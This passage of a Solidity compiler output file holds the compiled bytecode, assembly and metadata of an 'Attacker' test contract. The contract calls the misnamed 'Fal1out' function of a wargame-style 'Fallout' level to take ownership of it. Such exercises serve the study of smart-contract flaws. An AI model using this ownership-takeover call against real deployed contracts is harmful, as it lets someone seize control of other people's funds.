					"metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"Fal1out\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"allocate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"allocator\",\"type\":\"address\"}],\"name\":\"allocatorBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"collectAllocations\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"allocator\",\"type\":\"address\"}],\"name\":\"sendAllocation\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/level02.sol\":\"Fallout\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xaa0e11a791bc975d581a4f5b7a8d9c16a880a354c89312318ae072ae3e740409\",\"urls\":[\"bzz-raw://982d8b344f76193834260436d74c81e5a8f9e89106bb4cd72bbaabda4f3f59c2\",\"dweb:/ipfs/QmSrvP5TkQRhKDVCTpsV3uaKLBhkt7PjUY89vdtM9o5ybK\"]},\"src/level02.sol\":{\"keccak256\":\"0x0af8403d1769ea6f400618cf5e15f2a9305a2febd6da4d207c7dc03dc53759dd\",\"urls\":[\"bzz-raw://847b0662be670c349c1b83b703c1b87d1ce26f58d6244661af8c7502232adf40\",\"dweb:/ipfs/QmaePC3KaaPtrRTdEB7sR6dNtkGt31xydVAx6ZTwVkmdz8\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 196,
								"contract": "src/level02.sol:Fallout",
								"label": "allocations",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 198,
								"contract": "src/level02.sol:Fallout",
								"label": "owner",
								"offset": 0,
								"slot": "1",
								"type": "t_address_payable"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_address_payable": {
								"encoding": "inplace",
								"label": "address payable",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"tests/test02.sol": {
				"Attacker": {
					"abi": [
						{
							"inputs": [],
							"name": "test",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"tests/test02.sol\":86:269  contract Attacker... */\n  mstore(0x40, 0x80)\n    /* \"tests/test02.sol\":152:194  0xc379b76ee07Ad37f661DFDaa4002Df5E0eF22d9C */\n  0xc379b76ee07ad37f661dfdaa4002df5e0ef22d9c\n    /* \"tests/test02.sol\":110:197  Fallout level02 = Fallout(payable(address(0xc379b76ee07Ad37f661DFDaa4002Df5E0eF22d9C))) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"tests/test02.sol\":86:269  contract Attacker... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"tests/test02.sol\":86:269  contract Attacker... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"tests/test02.sol\":86:269  contract Attacker... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"tests/test02.sol\":86:269  contract Attacker... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xf8a8fd6d\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"tests/test02.sol\":204:267  function test() external... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"tests/test02.sol\":243:250  level02 */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"tests/test02.sol\":243:258  level02.Fal1out */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x6fab5ddf\n        /* \"tests/test02.sol\":243:260  level02.Fal1out() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_7\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_7:\n        /* \"tests/test02.sol\":243:260  level02.Fal1out() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_9:\n        /* \"tests/test02.sol\":243:260  level02.Fal1out() */\n      pop\n      pop\n      pop\n      pop\n        /* \"tests/test02.sol\":204:267  function test() external... */\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220685b126aa05dc01d8b70691388056777d304ca5bc2cb95962ad9f857afba930b64736f6c63430006000033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405273c379b76ee07ad37f661dfdaa4002df5e0ef22d9c6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5060ec806100736000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063f8a8fd6d14602d575b600080fd5b60336035565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636fab5ddf6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015609d57600080fd5b505af115801560b0573d6000803e3d6000fd5b5050505056fea2646970667358221220685b126aa05dc01d8b70691388056777d304ca5bc2cb95962ad9f857afba930b64736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xC379B76EE07AD37F661DFDAA4002DF5E0EF22D9C PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xEC DUP1 PUSH2 0x73 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xF8A8FD6D EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6FAB5DDF PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x9D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xB0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH9 0x5B126AA05DC01D8B70 PUSH10 0x1388056777D304CA5BC2 0xCB SWAP6 SWAP7 0x2A 0xD9 0xF8 JUMPI 0xAF 0xBA SWAP4 SIGNEXTEND PUSH5 0x736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "86:183:2:-:0;;;152:42;110:87;;;;;;;;;;;;;;;;;;;;86:183;8:9:-1;5:2;;;30:1;27;20:12;5:2;86:183:2;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c8063f8a8fd6d14602d575b600080fd5b60336035565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636fab5ddf6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015609d57600080fd5b505af115801560b0573d6000803e3d6000fd5b5050505056fea2646970667358221220685b126aa05dc01d8b70691388056777d304ca5bc2cb95962ad9f857afba930b64736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xF8A8FD6D EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x35 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6FAB5DDF PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x9D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xB0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH9 0x5B126AA05DC01D8B70 PUSH10 0x1388056777D304CA5BC2 0xCB SWAP6 SWAP7 0x2A 0xD9 0xF8 JUMPI 0xAF 0xBA SWAP4 SIGNEXTEND PUSH5 0x736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "86:183:2:-:0;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;86:183:2;;;;;;;;;;;;;;;;;;;204:63;;;:::i;:::-;;;243:7;;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;243:17:2;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;243:17:2;;;;204:63::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "47200",
								"executionCost": "20966",
								"totalCost": "68166"
							},
							"external": {
								"test()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 86,
									"end": 269,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "MSTORE"
								},
								{
									"begin": 152,
									"end": 194,
									"name": "PUSH",
									"value": "C379B76EE07AD37F661DFDAA4002DF5E0EF22D9C"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "DUP1"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "EXP"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "DUP2"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "SLOAD"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "DUP2"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "MUL"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "NOT"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "AND"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "SWAP1"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "DUP4"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "AND"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "MUL"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "OR"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "SWAP1"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "SSTORE"
								},
								{
									"begin": 110,
									"end": 197,
									"name": "POP"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "POP"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "DUP1"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "CODECOPY"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 86,
									"end": 269,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220685b126aa05dc01d8b70691388056777d304ca5bc2cb95962ad9f857afba930b64736f6c63430006000033",
									".code": [
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "MSTORE"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "POP"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "LT"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "JUMPI"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "SHR"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "DUP1"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "F8A8FD6D"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "EQ"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "JUMPI"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "JUMPDEST"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "DUP1"
										},
										{
											"begin": 86,
											"end": 269,
											"name": "REVERT"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "JUMPDEST"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "JUMPDEST"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "STOP"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "JUMPDEST"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "DUP1"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "SWAP1"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "SLOAD"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "SWAP1"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "EXP"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "SWAP1"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "DIV"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 243,
											"end": 250,
											"name": "AND"
										},
										{
											"begin": 243,
											"end": 258,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 243,
											"end": 258,
											"name": "AND"
										},
										{
											"begin": 243,
											"end": 258,
											"name": "PUSH",
											"value": "6FAB5DDF"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "MLOAD"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "AND"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "SHL"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "MLOAD"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP4"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "SUB"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP8"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "GAS"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "CALL"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 243,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 204,
											"end": 267,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"test()": "f8a8fd6d"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"test\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"tests/test02.sol\":\"Attacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xaa0e11a791bc975d581a4f5b7a8d9c16a880a354c89312318ae072ae3e740409\",\"urls\":[\"bzz-raw://982d8b344f76193834260436d74c81e5a8f9e89106bb4cd72bbaabda4f3f59c2\",\"dweb:/ipfs/QmSrvP5TkQRhKDVCTpsV3uaKLBhkt7PjUY89vdtM9o5ybK\"]},\"src/level02.sol\":{\"keccak256\":\"0x0af8403d1769ea6f400618cf5e15f2a9305a2febd6da4d207c7dc03dc53759dd\",\"urls\":[\"bzz-raw://847b0662be670c349c1b83b703c1b87d1ce26f58d6244661af8c7502232adf40\",\"dweb:/ipfs/QmaePC3KaaPtrRTdEB7sR6dNtkGt31xydVAx6ZTwVkmdz8\"]},\"tests/test02.sol\":{\"keccak256\":\"0xefe45a76f80b0916524b9f5856fb22355a95906b1e2b7adb8359a3474ae64f14\",\"urls\":[\"bzz-raw://c760ba4db942a35a387578256343d23876348af98dfd230bab820f9028c0bfb5\",\"dweb:/ipfs/QmcZysxo1Zq5F7Zt9UyHZNTkrGyLyprJc1GFA8KQgNuYgF\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 311,
								"contract": "tests/test02.sol:Attacker",
								"label": "level02",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Fallout)297"
							}
						],
						"types": {
							"t_contract(Fallout)297": {
								"encoding": "inplace",
								"label": "contract Fallout",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							186
						]
					},
					"id": 187,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": "@dev Wrappers over Solidity's arithmetic operations with added overflow\nchecks.\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\nin bugs, because programmers usually assume that an overflow raises an\nerror, which is the standard behavior in high level programming languages.\n`SafeMath` restores this intuition by reverting the transaction when an\noperation overflows.\n * Using this library instead of the unchecked operations eliminates an entire\nclass of bugs, so it's recommended to use it always.",
							"fullyImplemented": true,
							"id": 186,
							"linearizedBaseContracts": [
								186
							],
							"name": "SafeMath",
